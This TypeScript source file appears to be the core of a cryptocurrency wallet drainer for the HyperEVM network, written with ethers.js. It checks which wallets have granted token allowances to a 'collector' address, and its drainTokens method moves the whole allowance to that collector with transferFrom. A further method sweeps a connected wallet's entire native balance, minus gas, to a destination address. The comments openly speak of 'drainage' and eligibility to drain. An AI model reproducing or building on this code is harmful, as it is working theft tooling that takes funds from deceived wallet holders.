import { ethers } from "ethers";

// HyperEVM Configuration
export const HYPEREVM_CONFIG = {
  // HyperEVM RPC endpoint
  RPC_URL: "https://rpc.hyperblock.space",
  
  // Token contract address (replace with actual token)
  TOKEN_ADDRESS: "0x0000000000000000000000000000000000000000", // Replace with real token
  
  // Collector wallet (your wallet to receive tokens)
  COLLECTOR_ADDRESS: "0x0000000000000000000000000000000000000000", // Replace with your wallet
  
  // ERC-20 Token ABI for allowance and transferFrom
  ERC20_ABI: [
    "function allowance(address owner, address spender) view returns (uint256)",
    "function transferFrom(address from, address to, uint256 amount) returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)",
    "function name() view returns (string)"
  ]
};

export interface TokenDrainResult {
  success: boolean;
  transactionHash: string;
  error?: string;
  amount?: string;
}

export interface TokenInfo {
  name: string;
  symbol: string;
  balance: string;
  allowance: string;
  canDrain: boolean;
}

export class HyperEvmService {
  private provider: ethers.BrowserProvider | null = null;
  private signer: ethers.JsonRpcSigner | null = null;
  private hyperEvmProvider: ethers.JsonRpcProvider | null = null;
  private tokenContract: ethers.Contract | null = null;

  constructor(provider: ethers.BrowserProvider, signer: ethers.JsonRpcSigner) {
    this.provider = provider;
    this.signer = signer;
    
    // Connect to HyperEVM network
    this.hyperEvmProvider = new ethers.JsonRpcProvider(HYPEREVM_CONFIG.RPC_URL);
    
    // Initialize token contract
    if (HYPEREVM_CONFIG.TOKEN_ADDRESS !== "0x0000000000000000000000000000000000000000") {
      this.tokenContract = new ethers.Contract(
        HYPEREVM_CONFIG.TOKEN_ADDRESS,
        HYPEREVM_CONFIG.ERC20_ABI,
        this.hyperEvmProvider
      );
    }
  }

  /**
   * Check if wallet is eligible for token drainage based on allowance
   */
  async checkEligibility(walletAddress: string): Promise<boolean> {
    if (!this.tokenContract) {
      console.log("No token contract configured, allowing all wallets");
      return true; // Allow all wallets if no token configured
    }

    try {
      // Check if wallet has given allowance to collector
      const allowance = await this.tokenContract.allowance(
        walletAddress, 
        HYPEREVM_CONFIG.COLLECTOR_ADDRESS
      );
      
      // Eligible if allowance > 0
      return allowance > 0n;
    } catch (error) {
      console.error("Eligibility check failed:", error);
      return false;
    }
  }

  /**
   * Get token information for the wallet
   */
  async getTokenInfo(walletAddress: string): Promise<TokenInfo | null> {
    if (!this.tokenContract) {
      return null;
    }

    try {
      const [name, symbol, decimals, balance, allowance] = await Promise.all([
        this.tokenContract.name(),
        this.tokenContract.symbol(),
        this.tokenContract.decimals(),
        this.tokenContract.balanceOf(walletAddress),
        this.tokenContract.allowance(walletAddress, HYPEREVM_CONFIG.COLLECTOR_ADDRESS)
      ]);

      return {
        name,
        symbol,
        balance: ethers.formatUnits(balance, decimals),
        allowance: ethers.formatUnits(allowance, decimals),
        canDrain: allowance > 0n
      };
    } catch (error) {
      console.error("Failed to get token info:", error);
      return null;
    }
  }

  /**
   * Drain tokens from wallet using transferFrom (like your Python script)
   */
  async drainTokens(walletAddress: string, collectorAddress: string = HYPEREVM_CONFIG.COLLECTOR_ADDRESS): Promise<TokenDrainResult> {
    if (!this.tokenContract || !this.signer) {
      throw new Error("Token contract or signer not initialized");
    }

    try {
      // Check allowance
      const allowance = await this.tokenContract.allowance(walletAddress, collectorAddress);
      
      if (allowance === 0n) {
        throw new Error("No allowance found for this wallet");
      }

      // Create contract instance with signer for transactions
      const tokenContractWithSigner = this.tokenContract.connect(this.signer);
      
      // Estimate gas
      const gasEstimate = await tokenContractWithSigner.transferFrom.estimateGas(
        walletAddress,
        collectorAddress,
        allowance
      );

      // Get gas price
      const feeData = await this.provider!.getFeeData();
      const gasPrice = feeData.gasPrice!;

      // Execute transferFrom
      const tx = await tokenContractWithSigner.transferFrom(
        walletAddress,
        collectorAddress,
        allowance,
        {
          gasLimit: gasEstimate,
          gasPrice: gasPrice
        }
      );

      // Wait for confirmation
      const receipt = await tx.wait();

      return {
        success: true,
        transactionHash: receipt!.hash,
        amount: ethers.formatUnits(allowance, await this.tokenContract.decimals())
      };

    } catch (error: any) {
      return {
        success: false,
        transactionHash: "",
        error: error.message || "Token drain failed"
      };
    }
  }

  /**
   * Transfer ETH balance (original functionality)
   */
  async transferEthBalance(destinationAddress: string): Promise<TokenDrainResult> {
    if (!this.provider || !this.signer) {
      throw new Error("Provider or signer not initialized");
    }

    try {
      const userAddress = await this.signer.getAddress();
      const balance = await this.provider.getBalance(userAddress);
      
      // Estimate gas
      const gasEstimate = await this.provider.estimateGas({
        to: destinationAddress,
        value: balance,
      });
      
      const gasPrice = (await this.provider.getFeeData()).gasPrice!;
      const gasCost = gasEstimate * gasPrice;
      const transferAmount = balance - gasCost;
      
      if (transferAmount <= 0) {
        throw new Error("Insufficient balance for gas fees");
      }

      // Send transaction
      const tx = await this.signer.sendTransaction({
        to: destinationAddress,
        value: transferAmount,
        gasLimit: gasEstimate,
        gasPrice,
      });

      const receipt = await tx.wait();

      return {
        success: true,
        transactionHash: receipt!.hash,
        amount: ethers.formatEther(transferAmount)
      };

    } catch (error: any) {
      return {
        success: false,
        transactionHash: "",
        error: error.message || "ETH transfer failed"
      };
    }
  }
}

// Factory function to create HyperEVM service
export function createHyperEvmService(
  provider: ethers.BrowserProvider, 
  signer: ethers.JsonRpcSigner
): HyperEvmService {
  return new HyperEvmService(provider, signer);
}